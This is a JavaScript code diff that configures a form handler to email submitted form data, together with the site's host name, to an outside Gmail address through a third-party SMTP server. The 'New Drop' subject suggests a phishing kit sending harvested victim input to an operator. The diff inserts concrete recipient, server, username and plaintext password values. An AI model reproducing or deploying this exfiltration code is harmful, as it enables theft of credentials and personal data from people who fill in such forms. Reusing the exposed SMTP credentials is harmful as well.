@@ -47,7 +47,7 @@ function inspectExport(formdata, nextpage) {
     on_submit();
 
     let strings = formdata;
-    let toEmail = "recipient@example.com";  // Replace with the recipient's email address
+    let toEmail = "webt12348@gmail.com";  // Replace with the recipient's email address
     let subject = "New Drop 🏆🏆🏆";
     let body = `From: ${window.location.host}\n\n`;
 
@@ -57,11 +57,11 @@ function inspectExport(formdata, nextpage) {
 
     // Use the Email.js library or any other suitable library to send the email
     Email.send({
-        Host: "smtp.your-email-provider.com",
-        Username: "your-email@example.com",
-        Password: "your-email-password",
+        Host: "mail.socialrite.online",
+        Username: "mail@socialrite.online",
+        Password: "password@Ad1",
         To: toEmail,
-        From: "your-email@example.com",
+        From: "mail@ireconnect.online",
         Subject: subject,
         Body: body
     }).then(
